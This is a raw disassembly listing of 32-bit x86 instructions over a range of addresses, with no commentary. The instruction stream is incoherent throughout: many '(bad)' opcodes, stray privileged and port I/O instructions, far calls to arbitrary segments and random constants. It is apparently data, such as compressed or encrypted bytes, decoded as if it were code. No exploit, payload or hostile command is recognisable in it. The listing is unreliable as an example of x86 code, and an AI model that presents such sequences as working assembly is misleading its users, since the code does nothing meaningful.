  414939:	sub    BYTE PTR [ebx-0x7c],bh
  41493c:	dec    ecx
  41493d:	(bad)
  414940:	jne    0x414963
  414942:	shl    BYTE PTR [edi-0x49],1
  414945:	inc    BYTE PTR [ebx]
  414947:	inc    edi
  414948:	ret    0x547c
  41494b:	mov    DWORD PTR ds:0x74e37243,ecx
  414951:	cld    
  414952:	gs ins BYTE PTR es:[edi],dx
  414954:	fs inc edx
  414956:	mov    esp,0xb2f8f6f8
  41495b:	(bad)  
  41495c:	xchg   esp,eax
  41495d:	jle    0x4148f0
  41495f:	das    
  414960:	in     eax,0xd1
  414962:	cmp    eax,0x450180ff
  414967:	mov    DWORD PTR ds:0xda3af0ad,ecx
  41496d:	and    BYTE PTR [eax],al
	...
  4149d3:	add    BYTE PTR [eax],al
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	dec    ebp
  4149e3:	not    DWORD PTR [esi+0x6e]
  4149e6:	fiadd  WORD PTR [bx+si]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [eax+ebx*1],dl
  4149f0:	icebp  
  4149f1:	pop    edi
  4149f2:	sar    BYTE PTR ds:0xe944996c,0x91
  4149f9:	pop    ecx
  4149fa:	ret    0x8d52
  4149fd:	cmp    BYTE PTR [esi+0x7b],al
  414a00:	add    ch,BYTE PTR [ebx+ecx*2+0x10]
  414a04:	lods   eax,DWORD PTR ds:[esi]
  414a05:	lods   eax,DWORD PTR ds:[esi]
  414a06:	int    0xcf
  414a08:	sbb    BYTE PTR [ecx+0x7e],ah
  414a0b:	and    eax,0xeab86224
  414a10:	jbe    0x4149d7
  414a12:	cmp    DWORD PTR fs:[ebx+0x6f],esp
  414a16:	lea    ecx,[edi-0x7843eeed]
  414a1c:	jle    0x4149f4
  414a1e:	jp     0x414a96
  414a20:	shl    DWORD PTR [eax+0x34a637c1],0xd6
  414a27:	fs sbb dh,ch
  414a2a:	pop    edi
  414a2b:	pusha  
  414a2c:	(bad)  
  414a2d:	std    
  414a2e:	jae    0x414a43
  414a30:	or     DWORD PTR [edi-0x3a],esi
  414a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a34:	stos   BYTE PTR es:[edi],al
  414a35:	cmc    
  414a36:	icebp  
  414a37:	xchg   esp,eax
  414a38:	jecxz  0x414a62
  414a3a:	inc    ebx
  414a3b:	nop
  414a3c:	or     eax,0x19ec7f42
  414a41:	outs   dx,BYTE PTR ds:[esi]
  414a42:	jmp    0x414ab2
  414a44:	pop    esi
  414a45:	fcmovnbe st,st(0)
  414a47:	inc    edi
  414a48:	dec    edi
  414a49:	dec    edi
  414a4a:	jp     0x414a94
  414a4c:	nop
  414a4d:	imul   esi,DWORD PTR [ebx-0x4c],0x74abb905
  414a54:	dec    eax
  414a55:	or     cl,cl
  414a57:	and    cl,BYTE PTR fs:[edx-0x28]
  414a5b:	ret    
  414a5c:	imul   edx,edi,0xffffffaa
  414a5f:	out    dx,eax
  414a60:	pop    eax
  414a61:	test   DWORD PTR [edi-0x3e],0xaa026a6c
  414a68:	add    BYTE PTR [edx+0xa54ec93],bl
  414a6e:	repz fmul st,st(6)
  414a71:	lds    edi,FWORD PTR [eax-0x6ca94fae]
  414a77:	push   cs
  414a78:	aam    0xdf
  414a7a:	mov    ch,0x61
  414a7c:	test   DWORD PTR [ebp+0x57216015],esi
  414a82:	sbb    eax,DWORD PTR [edx+0x322a4f32]
  414a88:	push   cs
  414a89:	out    dx,eax
  414a8a:	and    al,ch
  414a8c:	arpl   WORD PTR [ebp+0xb],dx
  414a8f:	or     al,0xbd
  414a91:	mov    bh,0x42
  414a93:	inc    ebx
  414a94:	imul   BYTE PTR [edx]
  414a96:	push   ebp
  414a97:	inc    esp
  414a98:	in     eax,dx
  414a99:	inc    esi
  414a9a:	aas    
  414a9b:	xlat   BYTE PTR ds:[ebx]
  414a9c:	xchg   ebp,eax
  414a9d:	test   eax,0x8d5f59c4
  414aa2:	jl     0x414aae
  414aa4:	cld    
  414aa5:	inc    eax
  414aa6:	inc    eax
  414aa7:	nop
  414aa8:	push   ss
  414aa9:	or     DWORD PTR [ebp+0x67],edi
  414aac:	fmul   DWORD PTR [ecx]
  414aae:	scas   eax,DWORD PTR es:[edi]
  414aaf:	push   eax
  414ab0:	push   esp
  414ab1:	mov    ah,0x83
  414ab3:	and    al,0x71
  414ab5:	jg     0x414aaf
  414ab7:	sub    ah,ah
  414ab9:	fs xchg esp,eax
  414abb:	mov    ah,0x45
  414abd:	xor    DWORD PTR [ebx-0xd],ecx
  414ac0:	lahf   
  414ac1:	xchg   edx,eax
  414ac2:	or     BYTE PTR [ecx],0xb1
  414ac5:	loope  0x414a53
  414ac7:	lods   al,BYTE PTR ds:[esi]
  414ac8:	inc    edx
  414ac9:	rol    BYTE PTR [ecx+eiz*8+0x1243f554],cl
  414ad0:	jecxz  0x414ae2
  414ad2:	sub    eax,0x2e6bfabc
  414ad7:	push   ds
  414ad8:	lds    edx,FWORD PTR [eax+0x6b]
  414adb:	sub    eax,0x102c8a16
  414ae0:	rcr    al,1
  414ae2:	not    dh
  414ae4:	mov    al,ds:0xc029bc21
  414ae9:	aad    0xec
  414aeb:	inc    ecx
  414aec:	xchg   esi,eax
  414aed:	jno    0x414aef
	...
  414b53:	add    BYTE PTR [eax],al
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   WORD PTR [ebx+0x4a],si
  414b64:	mov    edx,0xdf672b
  414b69:	add    BYTE PTR [eax],al
  414b6b:	add    DWORD PTR [eax],eax
  414b6d:	add    BYTE PTR [edx+0x7e],ah
  414b70:	mov    cl,0x2
  414b72:	mov    ch,BYTE PTR [ebx]
  414b74:	add    al,bh
  414b76:	(bad)  
  414b77:	data16 mov ds:0xdd195c4e,al
  414b7d:	fwait
  414b7e:	push   ebp
  414b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b80:	jbe    0x414bea
  414b82:	jne    0x414ba8
  414b84:	lods   eax,DWORD PTR ds:[esi]
  414b85:	push   ss
  414b86:	inc    ebp
  414b88:	mov    bl,0x79
  414b8a:	pop    ss
  414b8b:	fstp   st(0)
  414b8d:	in     al,dx
  414b8e:	xchg   esp,eax
  414b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b90:	push   0xac667e4a
  414b95:	fisttp DWORD PTR [eax-0x39b4ac8a]
  414b9b:	test   DWORD PTR [ecx+ebx*8],0x729f98f0
  414ba2:	ret    
  414ba3:	xor    al,0x2d
  414ba5:	sar    BYTE PTR [esi-0x57],1
  414ba8:	push   0x70528732
  414bad:	mov    edx,0x8b3edc99
  414bb2:	(bad)  
  414bb4:	call   0x3de9c1b6
  414bb9:	stos   BYTE PTR es:[edi],al
  414bba:	pop    esi
  414bbb:	into   
  414bbc:	iret   
  414bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bbe:	mov    WORD PTR [ebp+0x5db4ad13],ds
  414bc4:	add    al,0xde
  414bc7:	js     0x414b90
  414bc9:	mov    ebp,0x440b4b94
  414bce:	out    dx,eax
  414bcf:	add    al,0x9
  414bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bd2:	les    ebx,FWORD PTR [edx-0x301095ba]
  414bd8:	(bad)  
  414bd9:	xchg   ecx,eax
  414bda:	addr16 dec edx
  414bdc:	(bad)  
  414bdd:	mov    al,ds:0xf34646ec
  414be2:	dec    eax
  414be3:	retf   0x1fe6
  414be6:	mov    ch,0xd
  414be8:	lea    esp,[edi+0x10913672]
  414bee:	xchg   ebp,eax
  414bef:	nop    ebx
  414bf2:	jmp    0x414c46
  414bf4:	cmc    
  414bf5:	enter  0x3c80,0x4
  414bf9:	jmp    0x414bb2
  414bfb:	in     al,dx
  414bfc:	jns    0x414b9e
  414bfe:	in     al,0xea
  414c00:	and    DWORD PTR [ebx-0x5728c2e5],esp
  414c06:	or     bh,BYTE PTR [esi+0x10]
  414c09:	pop    esi
  414c0a:	or     ah,BYTE PTR [esi+0x70]
  414c0d:	mov    ebp,0x22f6ed7e
  414c12:	bound  eax,QWORD PTR [eax+ecx*1+0x10]
  414c16:	xchg   DWORD PTR [esi-0x495263d8],ebx
  414c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c1d:	add    eax,DWORD PTR [eax+0x2e5bba77]
  414c23:	add    ecx,DWORD PTR [edi-0x3422d7f8]
  414c29:	and    ebp,edx
  414c2b:	jge    0x414c0e
  414c2d:	mov    DWORD PTR ds:0x76173335,edx
  414c33:	push   es
  414c34:	push   0xe440b01d
  414c39:	mov    bh,0xdb
  414c3b:	pop    eax
  414c3c:	mov    ebp,0x205010f0
  414c41:	out    0x9,al
  414c43:	cmp    bh,BYTE PTR [edi+0x67]
  414c46:	add    BYTE PTR [esi-0x53],bh
  414c49:	dec    eax
  414c4a:	jns    0x414c98
  414c4c:	inc    eax
  414c4d:	aas    
  414c4e:	pop    edx
  414c4f:	push   0xffffffa4
  414c51:	inc    ecx
  414c52:	fiadd  WORD PTR [edx+0x725beaf7]
  414c58:	jmp    0x414bf2
  414c5a:	push   ebp
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	rcl    DWORD PTR [eax+0x6360a545],0x61
  414c63:	pop    esi
  414c64:	push   es
  414c65:	mov    eax,ds:0xc6b4770
  414c6a:	test   ebp,ecx
  414c6c:	push   esp
  414c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	cs adc eax,ecx
  414ce3:	pop    esp
  414ce4:	cmp    esp,DWORD PTR [ebx]
  414ce6:	addr16 loopne 0x414ce9
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    BYTE PTR [edx-0x44c3353],dl
  414cf3:	cmp    esi,edi
  414cf5:	pop    ss
  414cf6:	jg     0x414ce4
  414cf8:	(bad)  
  414cf9:	push   ds
  414cfa:	mov    edi,0xa5299822
  414cff:	xor    BYTE PTR [edi-0x9],cl
  414d02:	aam    0x1
  414d04:	cli    
  414d05:	into   
  414d06:	jg     0x414d7b
  414d08:	pop    ebx
  414d09:	push   edi
  414d0a:	xor    eax,0x34b02dd
  414d0f:	mov    esp,0xb92f6af2
  414d14:	jle    0x414d3d
  414d16:	mul    BYTE PTR [eax-0xd]
  414d19:	jo     0x414caf
  414d1b:	fcmove st,st(6)
  414d1d:	xchg   edx,eax
  414d1e:	xor    bl,BYTE PTR [eax]
  414d20:	inc    ecx
  414d21:	cmc    
  414d22:	data16 jns 0x414d73
  414d25:	sbb    dh,ah
  414d27:	js     0x414cdc
  414d29:	xor    DWORD PTR [ebx-0x6813427d],ebx
  414d2f:	retf   
  414d30:	mov    ebx,0x1c35297b
  414d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d36:	jbe    0x414d9f
  414d38:	lahf   
  414d39:	popf   
  414d3a:	and    eax,0x67a47195
  414d3f:	fnsave [edi+0x191ae996]
  414d45:	mov    edi,0xdb76d049
  414d4a:	and    al,0xc8
  414d4c:	pop    edi
  414d4d:	push   edi
  414d4e:	xchg   esi,eax
  414d4f:	cmp    DWORD PTR [edx+0x34],esi
  414d52:	mov    ds:0xe69c4505,al
  414d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d58:	add    eax,0x3d24feda
  414d5d:	ja     0x414d45
  414d5f:	jbe    0x414d0d
  414d61:	not    al
  414d63:	dec    esi
  414d64:	mov    dh,0x95
  414d66:	(bad)  
  414d67:	mov    ebx,0x61d2fd67
  414d6c:	jo     0x414dc9
  414d6e:	cs push 0xf0f7a0c3
  414d74:	push   esi
  414d75:	cmp    eax,0x8f4297b7
  414d7a:	jns    0x414d89
  414d7c:	dec    ecx
  414d7d:	in     al,0x0
  414d7f:	fild   DWORD PTR [edx+0x41f04d76]
  414d85:	and    DWORD PTR [edi],0x3e
  414d88:	mov    ebp,0xdcddeaab
  414d8d:	or     al,0x6d
  414d8f:	xchg   ebp,eax
  414d90:	jl     0x414dfe
  414d92:	inc    edi
  414d93:	adc    DWORD PTR [eax-0x71],ecx
  414d96:	xor    DWORD PTR [esp+ecx*8+0x42ae5b89],esp
  414d9d:	movzx  esi,BYTE PTR [ebx]
  414da0:	fadd   DWORD PTR [ebp+0x4d]
  414da3:	adc    al,0x9e
  414da5:	jmp    DWORD PTR [ecx-0x13]
  414da8:	mov    dl,0x2e
  414daa:	stos   DWORD PTR es:[edi],eax
  414dab:	jle    0x414dfc
  414dad:	outs   dx,DWORD PTR ds:[esi]
  414dae:	pop    edi
  414daf:	les    edx,FWORD PTR [eax-0x5c]
  414db2:	clc    
  414db3:	dec    edi
  414db4:	cdq    
  414db5:	sub    bh,BYTE PTR [bx+si+0x2c]
  414db9:	xchg   ebp,eax
  414dba:	push   eax
  414dbb:	aaa    
  414dbc:	add    al,0x94
  414dbe:	leave  
  414dbf:	inc    ebp
  414dc0:	fwait
  414dc1:	(bad)  
  414dc2:	hlt    
  414dc3:	nop
  414dc4:	jmp    0xd3ec:0xdf2a2728
  414dcb:	lahf   
  414dcc:	sti    
  414dcd:	cmp    al,0x88
  414dcf:	loopne 0x414e42
  414dd1:	fs iret 
  414dd3:	aas    
  414dd4:	and    al,0x5f
  414dd6:	hlt    
  414dd7:	arpl   di,cx
  414dd9:	(bad)
  414ddd:	add    ebp,DWORD PTR [ebp+0x559a9351]
  414de3:	mov    dl,0x1e
  414de5:	pop    esp
  414de6:	mov    esi,0x1c446dc1
  414deb:	dec    ebp
  414dec:	push   edi
  414ded:	rol    BYTE PTR [eax],cl
	...
  414e53:	add    BYTE PTR [eax],al
  414e55:	add    BYTE PTR [edi+0x3e911299],dh
  414e5b:	fwait
  414e5c:	mov    bh,0xbf
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x2bb2b4f6
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    ch,bh
  414e6f:	inc    BYTE PTR [ecx+0x67]
  414e72:	sub    DWORD PTR [edi],esp
  414e74:	sbb    DWORD PTR fs:[edx],edx
  414e77:	stc    
  414e78:	or     DWORD PTR [esi+0x6daef700],eax
  414e7e:	xor    ch,BYTE PTR [edi]
  414e80:	popa   
  414e81:	push   ecx
  414e82:	out    dx,eax
  414e83:	sbb    eax,0xa07827ae
  414e88:	xor    DWORD PTR [eax],eax
  414e8a:	push   ds
  414e8b:	call   0x9f87:0xe763af61
  414e92:	xor    edi,DWORD PTR [edi]
  414e94:	aam    0x5b
  414e96:	pop    es
  414e97:	sub    DWORD PTR ds:0x2df3e2cc,esp
  414e9d:	pop    edi
  414e9e:	int3   
  414e9f:	jg     0x414e6b
  414ea1:	push   edx
  414ea2:	(bad)  
  414ea3:	xor    DWORD PTR [edi-0x3],esi
  414ea6:	es or  al,0x5f
  414ea9:	pop    es
  414eaa:	mov    ah,0x63
  414eac:	cmc    
  414ead:	xchg   esi,eax
  414eae:	out    dx,eax
  414eaf:	arpl   WORD PTR [edi-0x45],di
  414eb2:	addr16 push es
  414eb4:	call   0x2d70ec2d
  414eb9:	mov    WORD PTR [esi-0x6a405b72],ss
  414ebf:	jae    0x414eaf
  414ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec2:	add    al,0x86
  414ec4:	mov    bh,0xd1
  414ec6:	fsubr  st(3),st
  414ec8:	jecxz  0x414f36
  414eca:	jne    0x414ec9
  414ecc:	sub    eax,0x696252f7
  414ed1:	dec    ebx
  414ed2:	push   0x731486d4
  414ed7:	je     0x414e85
  414ed9:	xor    DWORD PTR [esi+0x60],0x9f2987aa
  414ee0:	sti    
  414ee1:	pop    ds
  414ee2:	mov    al,0xbe
  414ee4:	mov    ebp,0xf19ef6b7
  414ee9:	mov    edi,0x609eefbe
  414eee:	sahf   
  414eef:	cs pop ecx
  414ef1:	addr16 out 0x2f,eax
  414ef4:	retf   0xef5e
  414ef7:	out    0x5d,eax
  414ef9:	arpl   WORD PTR [ecx],cx
  414efb:	adc    BYTE PTR [esi+edi*2-0x38980d77],bl
  414f02:	repz test BYTE PTR [ebx-0x1e322e35],al
  414f09:	and    eax,0x189e1528
  414f0e:	test   eax,0x4de3e91f
  414f13:	stos   DWORD PTR es:[edi],eax
  414f14:	pop    ds
  414f15:	test   BYTE PTR [edx-0x6c9279e3],bl
  414f1b:	iret   
  414f1c:	ins    DWORD PTR es:[edi],dx
  414f1d:	mov    edx,0xd5813586
  414f22:	pop    esi
  414f23:	into   
  414f24:	stos   DWORD PTR es:[edi],eax
  414f25:	mov    esi,0x9e24ab21
  414f2a:	js     0x414ebe
  414f2c:	jmp    0x414f61
  414f2e:	jmp    0x414f81
  414f30:	mov    ebx,0xb5fd7303
  414f35:	sbb    DWORD PTR [ebp-0x7d],edi
  414f38:	paddw  mm2,QWORD PTR [edi-0x6a81e6e1]
  414f3f:	mov    ebx,cs
  414f41:	sbb    DWORD PTR [edi+0x558e2c3a],esi
  414f47:	stos   DWORD PTR es:[edi],eax
  414f48:	pusha  
  414f49:	fcmovu st,st(0)
  414f4b:	lods   eax,DWORD PTR gs:[esi]
  414f4d:	mov    ebx,0x4a745e25
  414f52:	add    eax,0xbc36d123
  414f57:	aas    
  414f58:	pop    esp
  414f59:	sbb    DWORD PTR [edx-0x14],0x28f45208
  414f60:	sbb    ch,bl
  414f62:	ins    DWORD PTR es:[edi],dx
  414f63:	out    0x2f,eax
  414f65:	in     eax,0xe6
  414f67:	int3   
  414f68:	in     al,dx
  414f69:	jp     0x414fd2
  414f6b:	mov    dh,0x41
  414f6d:	popa   
	...
  414fd6:	aaa    
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0xb5046649
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fef:	mov    ch,0x51
  414ff1:	xor    al,0xba
  414ff3:	shr    ch,0xe
  414ff6:	dec    ebp
  414ff7:	fiadd  DWORD PTR [esi-0x49]
  414ffa:	jb     0x415017
  414ffc:	jb     0x41507b
  414ffe:	mov    esi,0x3d29f577
  415003:	xor    esp,edx
  415005:	pop    ss
  415006:	arpl   WORD PTR [eax],sp
  415008:	mov    eax,ds:0xea5a21e5
  41500d:	hlt    
  41500e:	dec    ecx
  41500f:	inc    DWORD PTR [ecx]
  415011:	pop    ebp
  415012:	test   BYTE PTR [ebx+0x45fd08cc],0x27
  415019:	cmp    ch,ah
  41501b:	jecxz  0x415024
  41501d:	push   ebx
  41501e:	cmp    al,0x2f
  415020:	xchg   edi,eax
  415021:	scas   eax,DWORD PTR es:[edi]
  415022:	mov    WORD PTR [edi+0x1e38167e],ds
  415028:	sub    al,0xd6
  41502a:	mov    al,ds:0xaa2524ca
  41502f:	adc    BYTE PTR [esi+edx*8-0x2b],al
  415033:	dec    edx
  415034:	mov    edx,0xf5ec4760
  415039:	retf   0xc0c4
  41503c:	push   ecx
  41503d:	jge    0x414ffd
  41503f:	push   ss
  415040:	pusha  
  415041:	jg     0x414ffe
  415043:	fimul  DWORD PTR [edi]
  415045:	sahf   
  415046:	sar    DWORD PTR [ecx+ebx*4],0x22
  41504a:	jno    0x415002
  41504c:	stc    
  41504d:	mov    ds:0xc3a28e43,eax
  415052:	popa   
  415053:	retf   0xbc65
  415056:	xor    DWORD PTR [ecx],esi
  415058:	add    dh,BYTE PTR [ebx-0x4a]
  41505b:	lods   al,BYTE PTR ds:[esi]
  41505c:	adc    dh,dl
  41505e:	add    cl,bl
  415060:	add    eax,0x57c3f083
  415065:	outs   dx,BYTE PTR ds:[esi]
  415066:	and    eax,0xe1a89718
  41506b:	pop    edx
  41506c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41506d:	xlat   BYTE PTR ds:[ebx]
  41506e:	cwde   
  41506f:	lods   al,BYTE PTR ds:[esi]
  415070:	in     al,0xeb
  415072:	int    0x96
  415074:	push   edx
  415075:	nop
  415076:	in     al,0xbe
  415078:	pusha  
  415079:	icebp  
  41507a:	inc    ebp
  41507b:	(bad)  
  41507c:	push   ecx
  41507d:	and    al,0x39
  41507f:	psrad  mm0,QWORD PTR [ebx-0x7]
  415083:	or     bl,BYTE PTR [ebp+0x6c9a10d7]
  415089:	dec    BYTE PTR [ebx+eax*2+0x2e]
  41508d:	je     0x4150b8
  41508f:	adc    edi,DWORD PTR [ecx]
  415091:	in     al,0x76
  415093:	ds call 0x3d91:0x7afa0d65
  41509b:	inc    ebp
  41509c:	inc    edi
  41509d:	inc    eax
  41509e:	adc    cl,BYTE PTR [ebx-0x21]
  4150a1:	mov    al,BYTE PTR [ebp+0xc57435e]
  4150a7:	mov    al,0x3
  4150a9:	mov    cl,0x6f
  4150ab:	lds    edi,FWORD PTR [eax-0x154740a4]
  4150b1:	mov    edi,0xf4617884
  4150b6:	and    eax,0x7fb5117a
  4150bb:	dec    edx
  4150bc:	pop    ds
  4150bd:	test   BYTE PTR [esp+ebp*4-0x2],dl
  4150c1:	jbe    0x4150cf
  4150c3:	das    
  4150c4:	mov    eax,ds:0xd85215f5
  4150c9:	and    ah,BYTE PTR [edi]
  4150cb:	inc    ebp
  4150cc:	retf   
  4150cd:	jno    0x415055
  4150cf:	js     0x41510a
  4150d1:	jp     0x41508f
  4150d3:	sti    
  4150d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150d5:	inc    edx
  4150d6:	jle    0x415124
  4150d8:	js     0x41513a
  4150da:	or     al,0x21
  4150dc:	mov    cl,0x72
  4150de:	vmwrite edx,ebp
  4150e1:	fstp   QWORD PTR [ecx+0x6d704946]
  4150e7:	sub    dh,BYTE PTR [edi]
  4150e9:	cs jne 0x415102
  4150ec:	or     esi,DWORD PTR [edx+0x0]
	...
  415153:	add    BYTE PTR [eax],al
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x24d7fc2d
  415164:	mov    eax,ds:0xe36700
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    BYTE PTR [eax-0x10f5c0f1],ch
  415173:	and    bl,ah
  415175:	adc    BYTE PTR [esi],dl
  415177:	call   0x5762:0x18bf625b
  41517e:	ret    0x216b
  415181:	sub    eax,0x76007af5
  415186:	push   es
  415187:	jbe    0x4151f5
  415189:	aas    
  41518a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41518b:	mov    esp,0x4c66d54c
  415190:	xchg   ecx,eax
  415191:	in     al,0xa6
  415193:	retf   
  415194:	(bad)  
  415196:	push   ebp
  415197:	ins    DWORD PTR es:[edi],dx
  415198:	cmp    esp,DWORD PTR [ecx+0xa964fe9]
  41519e:	xchg   esi,eax
  41519f:	(bad)  
  4151a0:	xor    eax,0x32b14f08
  4151a5:	mov    edi,0x9a47a8c
  4151aa:	sahf   
  4151ab:	aad    0xd9
  4151ad:	(bad)  
  4151ae:	(bad)  
  4151af:	lds    esp,FWORD PTR [ebx+0x30827ae]
  4151b5:	ror    ecx,1
  4151b7:	add    BYTE PTR [ebx+0x79],bh
  4151ba:	and    edx,esi
  4151bc:	(bad)  
  4151bd:	mov    ebp,0xb554cd91
  4151c2:	in     eax,0xfa
  4151c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151c5:	fstp   QWORD PTR [esi-0x57]
  4151c8:	cs push ss
  4151ca:	out    0x63,al
  4151cc:	sahf   
  4151cd:	cmp    eax,0x79e61a8a
  4151d3:	sub    DWORD PTR [edx],ebx
  4151d5:	lahf   
  4151d6:	push   edx
  4151d7:	sub    al,0xbb
  4151d9:	aas    
  4151da:	aas    
  4151db:	and    ebx,edi
  4151dd:	mov    al,0x19
  4151df:	cld    
  4151e0:	ds leave 
  4151e2:	sbb    eax,0x504011fc
  4151e7:	and    esi,DWORD PTR [eax]
  4151e9:	cli    
  4151ea:	cmp    cl,bh
  4151ec:	shl    BYTE PTR ds:0xdc9df10f,0x9b
  4151f3:	mov    esi,0x2616b9e0
  4151f8:	xlat   BYTE PTR ds:[ebx]
  4151f9:	push   0x49
  4151fb:	mov    cl,0xf2
  4151fd:	push   ds
  4151fe:	cwde   
  4151ff:	push   esi
  415200:	ins    DWORD PTR es:[edi],dx
  415201:	fidivr DWORD PTR [eax+ebx*8]
  415204:	and    ebx,DWORD PTR [eax]
  415206:	and    edx,esp
  415208:	mov    ecx,0x717ac7bc
  41520d:	mov    ds:0xfd0fbeb7,al
  415212:	retf   0x8d20
  415215:	imul   DWORD PTR [edi+0x4450928a]
  41521b:	call   0x65bf:0x31aa3fcf
  415222:	inc    edi
  415223:	add    dl,al
  415225:	cld    
  415226:	sub    al,0x35
  415228:	pop    ecx
  415229:	test   al,0x72
  41522b:	mov    edi,0xd4148545
  415230:	or     ecx,DWORD PTR [esi-0x162ebbac]
  415236:	es xchg esi,eax
  415238:	mov    bl,BYTE PTR [edx+0x1a27f03c]
  41523e:	xchg   DWORD PTR [esi-0x6f08110f],esi
  415244:	ret    
  415245:	hlt    
  415246:	test   eax,0x70b5d9eb
  41524b:	cmc    
  41524c:	(bad)  
  41524d:	aad    0x19
  41524f:	mov    bh,0xf
  415251:	int    0x4e
  415253:	inc    eax
  415254:	adc    esi,DWORD PTR [esi]
  415256:	xchg   ebx,eax
  415257:	out    dx,al
  415258:	shl    BYTE PTR [ebx+0x1],1
  41525b:	sbb    DWORD PTR [ebp+eax*1+0x564f39a6],eax
  415262:	cmp    eax,0x5ea16cff
  415267:	popa   
  415268:	out    dx,al
  415269:	sbb    BYTE PTR [edi],0x6f
  41526c:	sub    al,0x72
	...
  4152d6:	sub    al,0x97
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x69f09b0b
  4152e5:	pop    edx
  4152e6:	addr16 in al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    BYTE PTR [ebp+0x2c57af84],dl
  4152f3:	scas   eax,DWORD PTR es:[edi]
  4152f4:	(bad)  
  4152f6:	scas   eax,DWORD PTR es:[edi]
  4152f7:	push   0x40
  4152f9:	pusha  
  4152fa:	fwait
  4152fb:	mov    gs,ecx
  4152fd:	inc    edi
  4152fe:	adc    DWORD PTR [edx],ebp
  415300:	push   edi
  415301:	mov    ecx,0x645702d5
  415306:	inc    eax
  415307:	push   ebx
  415308:	loope  0x4152fe
  41530a:	push   esp
  41530b:	ds push ss
  41530d:	push   edx
  41530e:	sbb    ch,BYTE PTR [esi]
  415310:	inc    BYTE PTR [ebp-0xae49661]
  415316:	cwde   
  415317:	call   0xc2:0xdaa600f8
  41531e:	add    eax,0x4aee022d
  415323:	into   
  415324:	mov    edx,DWORD PTR [edi+eiz*1+0x26]
  415328:	xor    dl,BYTE PTR [ecx+0xed785c2]
  41532e:	add    eax,0xdb0dea01
  415333:	pop    esp
  415334:	jno    0x4152e0
  415336:	into   
  415337:	pop    edx
  415338:	xlat   BYTE PTR ds:[ebx]
  415339:	cmp    eax,0xad3ba62c
  41533e:	fs dec ebx
  415340:	push   eax
  415341:	mov    cl,0x0
  415343:	aas    
  415344:	dec    edi
  415345:	mov    ebp,0x933a6fd8
  41534a:	push   ds
  41534b:	jnp    0x415326
  41534d:	aaa    
  41534e:	jne    0x415306
  415350:	inc    esi
  415351:	test   eax,0x5c29be73
  415356:	jg     0x4153bd
  415358:	push   ebp
  415359:	es std 
  41535b:	lea    esp,[ebx-0x52]
  41535e:	cmc    
  41535f:	hlt    
  415360:	sub    BYTE PTR [edx-0x47],al
  415363:	test   BYTE PTR [eax+0x5ccfc9fb],0x79
  41536a:	lock xchg ecx,eax
  41536c:	mov    ecx,0x10b58669
  415371:	test   BYTE PTR [ebx],ah
  415373:	dec    esp
  415374:	sub    eax,0x87402246
  415379:	xchg   BYTE PTR [ebx],bh
  41537b:	mov    ah,0x2f
  41537d:	test   eax,0x892477cc
  415382:	sbb    al,0x81
  415384:	stos   DWORD PTR es:[edi],eax
  415385:	inc    eax
  415386:	bound  edi,QWORD PTR [ecx]
  415388:	pop    ebx
  415389:	nop
  41538a:	mov    al,0x94
  41538c:	hlt    
  41538d:	inc    DWORD PTR [eax]
  41538f:	cmp    ah,BYTE PTR [edi-0x1dfe5689]
  415395:	inc    ecx
  415396:	popf   
  415397:	das    
  415398:	and    al,0x1a
  41539a:	(bad)  
  41539b:	fcom   DWORD PTR [edi+0x33]
  41539e:	push   ebx
  41539f:	inc    ebp
  4153a0:	nop
  4153a1:	inc    ecx
  4153a2:	cmp    dh,BYTE PTR [ebx+0xc]
  4153a5:	mov    ecx,DWORD PTR [edx+0x4e7dc877]
  4153ab:	pop    eax
  4153ac:	lds    ebp,FWORD PTR ds:0x7eba4cbb
  4153b2:	jns    0x4153b0
